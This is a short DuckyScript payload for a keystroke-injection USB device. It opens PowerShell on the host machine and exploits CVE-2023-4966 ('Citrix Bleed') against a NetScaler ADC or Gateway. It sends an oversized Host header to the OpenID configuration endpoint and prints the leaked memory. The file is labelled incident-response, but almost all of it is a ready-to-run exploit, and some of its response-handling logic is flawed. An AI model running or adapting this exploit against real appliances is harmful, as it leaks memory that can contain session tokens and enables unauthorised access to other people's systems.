REM ################################################################################
REM #                                                                              #
REM # Title     : Exploit Citrix NetScaler ADC and Gateway through CVE-2023-4966   #
REM # Author	: Aleff                                                            #
REM # Version	: 1.0                                                              #
REM # Category	: incident-response                                                #
REM # Target	: Citrix NetScaler ADV; NetScaler Gateway                          #
REM #                                                                              #
REM ################################################################################

REM Define here your target, so put here the Citrix ADC / Gateway target, excluding the protocol (e.g. 192.168.1.200)
DEFINE #HOSTNAME example

REM Open a powershell
DELAY 2000
GUI r
DELAY 500
STRING powershell
ENTER
DELAY 1000

STRINGLN_BLOCK
    $header_value = 'a' * 24576
    $header_value = $header_value -replace "\n", ""

    $headers="-H 'Host:$header_value'"

    $headers = @{
        'Host' = $header_value
    }
    $uri = "https://#HOSTNAME/oauth/idp/.well-known/openid-configuration"
    $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method GET -TimeoutSec 10

    if ($response.Substring(0, 3) -eq "200") {
        Write-Host "--- Dumped memory ---"
        $response.Substring(131050)  # 131051 - 1
        Write-Host "The #HOSTNAME is vulnerable!"
        Write-Host "---      End      ---"
    } else {
        Write-Host "Could not dump memory"
    }
END_STRINGLN
